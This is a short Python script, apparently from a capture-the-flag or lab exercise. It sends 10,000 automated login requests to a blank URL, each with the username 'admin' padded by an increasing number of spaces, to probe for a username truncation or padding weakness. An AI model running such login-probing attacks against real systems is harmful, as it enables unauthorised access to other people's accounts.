import requests;

url=""
for i in range(10000):
	field="admin"+i*" "+"poto"
	myobj={'username':field,'password':'hohoho'}
	r=requests.post(url, data=myobj)
	print(str(r.status_code)+" "+field)